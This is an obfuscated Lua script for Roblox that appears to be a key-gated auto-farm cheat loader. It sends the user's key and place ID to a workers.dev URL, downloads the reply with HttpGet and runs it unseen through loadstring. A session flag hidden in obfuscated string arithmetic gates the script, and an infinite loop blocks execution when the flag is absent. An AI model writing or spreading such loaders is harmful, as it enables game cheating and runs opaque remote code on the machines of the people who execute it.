--[[
 .____                  ________ ___.    _____                           __                
 |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
 |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
 |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
 |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
         \/          \/         \/    \/                \/     \/     \/                   
          \_Welcome to LuaObfuscator.com   (Alpha 0.10.9) ~  Much Love, Ferib 

]]--

local v0=game:GetService("Players");local v1=v0.LocalPlayer;local v2=_G.USER_KEY;if  not v2 then return;end local v3="__"   .. string.char(75 + 8 ,97 -28 ,195 -112 ,1148 -(68 + 997) )   .. "_"   .. tostring(game.PlaceId) ;getgenv()[v3]=nil;local v5="https://weathered-union-1a56.doanhungff123123.workers.dev/?"   .. "key="   .. v2   .. "&place="   .. game.PlaceId ;local v6,v7=pcall(function() return game:HttpGet(v5);end);if  not v6 then return;end local v8=loadstring(v7);if (type(v8)~="function") then return;end v8();local v9=function() local v10="__"   .. string.char(1353 -(226 + 1044) ,996 -(214 + 713) ,21 + 62 ,14 + 69 )   .. "_"   .. tostring(game.PlaceId) ;if  not getgenv()[v10] then while true do end end getgenv()[v10]=nil;print("SCRIPT CHÍNH ĐANG CHẠY");while true do local v12=0;while true do if (v12==(877 -(282 + 595))) then task.wait(1639 -(1523 + 114) );print("Auto farm running...");break;end end end end;v9();
